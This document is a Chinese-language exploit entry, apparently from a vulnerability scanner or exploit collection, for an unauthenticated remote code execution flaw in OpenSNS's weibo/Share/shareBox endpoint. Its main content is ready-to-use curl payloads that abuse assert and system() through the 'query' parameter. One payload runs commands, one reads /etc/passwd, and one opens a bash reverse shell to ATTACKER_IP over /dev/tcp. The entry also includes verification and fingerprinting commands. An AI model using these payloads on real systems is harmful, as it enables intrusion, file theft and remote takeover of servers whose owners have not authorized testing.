---
id: OPENSNS-SHARE-RCE
title: OpenSNS ShareController 远程命令执行漏洞
product: opensns
vendor: OpenSNS
version_affected: "OpenSNS"
severity: CRITICAL
tags: [rce, code_injection, 无需认证, 国产]
fingerprint: ["OpenSNS", "opensns"]
---

## 漏洞描述

OpenSNS 的 `ShareController.class.php` 存在远程命令执行漏洞。攻击者可通过构造特殊的 `query` 参数调用 `Schedule` 模型的 `_validationFieldItem` 方法，利用 `assert` 函数执行任意 PHP 代码（包括 `system()` 命令）。

## 影响版本

- OpenSNS

## 前置条件

- 无需认证

## 利用步骤

1. 构造 GET 请求到 `/index.php?s=weibo/Share/shareBox`
2. 在 `query` 参数中注入调用链
3. 通过 assert + system 执行命令

## Payload

### 执行命令

```bash
curl -s "http://target/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system('id')"
```

### 读取文件

```bash
curl -s "http://target/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system('cat+/etc/passwd')"
```

### 反弹 Shell

```bash
curl -s "http://target/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system('bash+-c+\"bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261\"')"
```

## 验证方法

```bash
curl -s "http://target/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system('id')" | grep "uid="
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "OpenSNS"
```
